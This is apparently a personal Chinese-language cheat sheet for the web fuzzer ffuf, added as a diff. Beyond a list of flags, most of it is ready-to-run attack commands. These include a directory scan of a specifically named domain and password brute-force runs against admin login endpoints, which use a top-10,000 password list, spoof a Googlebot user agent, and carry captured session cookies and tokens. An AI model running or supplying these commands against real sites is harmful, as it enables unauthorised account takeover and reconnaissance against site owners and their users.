@@ -1,0 +1,54 @@
+ffuf 使用
+==================
+0x01 匹配#
+-mc 匹配HTTP状态码
+-ml lines 匹配lines(这个在结果中有体现)
+-mw Words 匹配字数
+-ms size 匹配大小
+0x02 过滤#
+-mr value 匹配正则（例如FUZZ任意文件读取时，非常的好用。匹配"root:x"）
+-fc 过滤HTTP状态码
+-fl 过滤lines
+-fs size 过滤长度
+-fw 过滤字数
+-fr 过滤正则（不带xxx）
+0x03 其他#
+-c 颜色
+-maxtime 最大时间
+-p 延长时间
+-v 详细模式
+-t 线程
+-replay-proxy 重播代理：使用此代理重播匹配的请求（Replay matched requests using this proxy）
+0x04 输出#
+HTML: -o file.html -of html
+CSV: -o file.csv -of csv
+ALL: -o output/file -of all
+==================
+
+单目标
+./ffuf   -w  /Users/cheveyo/Tools/Dict/fuzzDicts-master/directoryDicts/php/top3000.txt   -u https://www.xiangqiazx.com/FUZZ  -o xiangqiazx.com.csv -of  csv
+
+递归扫描(Recursion)
+如果我们想使用原有的字典库搜索到/webadmin/admin或者/webadmin/admin目录下的admin.php文件呢？
+
+这时，我们可以通过递归的方式进行搜索
+
+./ffuf -w wordlist-admin.txt -u https://test.iculture.cc/FUZZ -recursion
+
+
+多目标
+./ffuf -u https://W1/W2 -w site.txt:W1,wordlist-admin.txt:W2
+
+爆破：
+./ffuf  -H 'Content-Type:application/x-www-form-urlencoded;'  -H 'User-Agent:Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36'  
+-H 'Cookie: XSRF-TOKEN=eyJpdiI6IkZQVUpyc2dGXC9Zd0dlb3hsYlRIVEtBPT0iLCJ2YWx1ZSI6ImVzOTN6WUhwS3A3b2dRRGZKQjBSWUJGM1R5T3JoQ09RVm1ZNm5YTTYrK3NNekJtc3hqTFRSTUNKUVVqWEtwZFRXMjZyaU1VZ2JreGg3aFB3SUVyWVZRPT0iLCJtYWMiOiI1NjE1ZDJhMGJjMDczZWE5MmQ2NzJmNzk4ZmUzYzBmZjEwNDlmZmY4MmUyNjNjN2M5NDA5MjA1ZjAwMmI0ZDA0In0%3D; 
+laravel_session=eyJpdiI6InlJYTZPV0NEckUzbFQ2SllTS0dKWEE9PSIsInZhbHVlIjoiTE8yOUdZZVRkM01ra1B6QlwvNVVjcEtyVExISFllMnh6c1ExYkc1enVLSktZVGhKRG1MOUFRd2VHdzB1TWVcL3dvZEx6V1wvbDhlU2FyaHIrMnc5NGNjNXc9PSIsIm1hYyI6IjlkNWM2MGNkNWQ2NzZlYmNkMzk0YmQ2YmI4NGM1Y2U2YmRiN2IxNDA2MDM1YmQwNGViNDZlMjhkZTliM2Y0ODcifQ%3D%3D'
+-w /Users/cheveyo/Tools/Dict/Dictionary-Of-Pentesting-master/Password/pass_top10000_CN.txt  -u https://www.xx.com/doLogin -X POST  -d '_token=L3Fa0pBPNZ0HEaZc5Bbhs8aJw8i6cY2DAlIPQvSP&username=admin&password=FUZZ&code=5564' 
+-x http://127.0.0.1:8080  -fr "-2"
+./ffuf  -H 'Content-Type:application/json' -H 'User-Agent:Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36'  
+-w /Users/cheveyo/Tools/Dict/Dictionary-Of-Pentesting-master/Password/pass_top10000_CN.txt  -u https://www.xx.com/admin/checkLogin -X POST 
+ -d '{"userName":"admin","password":"FUZZ"}'  -fr "10012"
+./ffuf  -H 'Content-Type:application/x-www-form-urlencoded;'  -H 'User-Agent:Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36'  
+-H 'Cookie: ci_session=14p3guvulstb9qbr6j9h7o4fgosl0io3; off_url=%2Fadmin.html' -w /Users/cheveyo/Tools/Dict/Dictionary-Of-Pentesting-master/Password/pass_top10000_CN.txt  
+-u https://www.xx.net/admin/check.html -X POST  -d 'account=admin&password=FUZZ&verifycode=LRHEV' -x http://127.0.0.1:8080  -fr "密码不正确"
+
